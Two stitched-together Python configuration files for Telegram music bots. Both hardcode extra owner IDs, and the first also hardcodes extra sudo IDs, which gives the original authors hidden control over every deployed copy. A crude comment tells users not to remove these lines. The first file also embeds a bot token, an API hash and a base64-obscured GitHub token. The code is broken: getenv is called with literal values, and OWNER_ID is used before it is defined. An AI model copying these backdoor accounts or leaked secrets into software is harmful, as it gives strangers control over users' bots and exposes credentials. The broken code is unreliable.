##Config

import os
from os import getenv
from dotenv import load_dotenv
from base64 import b64decode

load_dotenv()
get_queue = {}

# Client
SESSION_NAME = getenv('SESSION_NAME', 'session')
API_ID = int(getenv('23184709'))
API_HASH = getenv('f99dd916ef41cf47ee094f771855468d')

# Bot
BOT_USERNAME = getenv("ryznmusicbot")
BOT_TOKEN = getenv('5524682825:AAF-R88Hx_AfetXZMg1_ykuz0Ti_psBOO6k')

# Music Setting
DURATION_LIMIT = int(getenv('DURATION_LIMIT', '3600'))
COMMAND_PREFIXES = list(getenv('COMMAND_PREFIXES', '/ . , : ; !').split())

# Database Mono
MONGO_DB_URI = getenv("MONGO_DB_URI")


# Sudo
SUDO_USERS = list(map(int, getenv('SUDO_USERS', '1209395963').split()))
OWNER_ID = list(map(int, getenv('OWNER_ID', '1534983792').split()))

# Log Chat
LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", '-1001836093985'))
LOG_CHANNEL_ID = int(getenv("LOG_CHANNEL_ID", '-1001844138965'))

# Assistant
ASS_ID = int(getenv("ASS_ID", '2030872456'))
AUTO_LEAVE = int(getenv("AUTO_LEAVE", "5600"))

# Support Channel
CHANNEL = getenv("CHANNEL", "Zennsupport")
GROUP = getenv("GROUP", "Virtualundercover")

# Update Stream
UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
REPO_URL = getenv("REPO_URL", "https://github.com/Ryzenstd/Ryzen-Music")
GIT_TOKEN = getenv(
    "GIT_TOKEN",
    b64decode("Z2hwX1kyeXl2d0MxdzBycFVkRlVMMUZjQ1hNQXd1TTFvNjIwVEZEbA==").decode(
        "utf-8"
    ),
)

# Heroku
HEROKU_API_KEY = getenv("HEROKU_API_KEY")
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")

# Broadcast
BROADCAST_AS_COPY = bool(os.environ.get("BROADCAST_AS_COPY", "False"))

SUDO_USERS.append("2042511048")
OWNER_ID.append("1534983792")


##Config

from os import getenv
from dotenv import load_dotenv

load_dotenv()
get_queue = {}
SESSION_NAME = getenv('SESSION_NAME', 'session')
BOT_TOKEN = getenv('BOT_TOKEN')
API_ID = int(getenv('API_ID', "10892147"))
API_HASH = getenv('API_HASH')







GROUP = getenv("GROUP", None)
CHANNEL = getenv("CHANNEL", None)

UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/muhammadrizky16/KyyMusic")
AUTO_LEAVE = int(getenv("AUTO_LEAVE", "1500"))
HEROKU_API_KEY = getenv("HEROKU_API_KEY")
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")

# KALO FORK/CLONE JAN DI HAPUS KENTOD
OWNER_ID.append(1663258664)
OWNER_ID.append(1607338903)
